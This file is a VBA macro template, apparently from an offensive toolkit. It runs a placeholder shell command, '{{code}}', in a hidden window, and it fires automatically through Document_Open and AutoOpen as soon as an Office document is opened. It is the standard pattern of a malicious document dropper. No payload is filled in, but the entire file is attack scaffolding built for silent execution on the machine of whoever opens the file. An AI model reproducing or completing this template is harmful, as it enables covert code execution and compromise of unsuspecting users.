Sub MyMacro()
    Dim str As String
    str = "{{code}}"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen() 
    MyMacro 
End Sub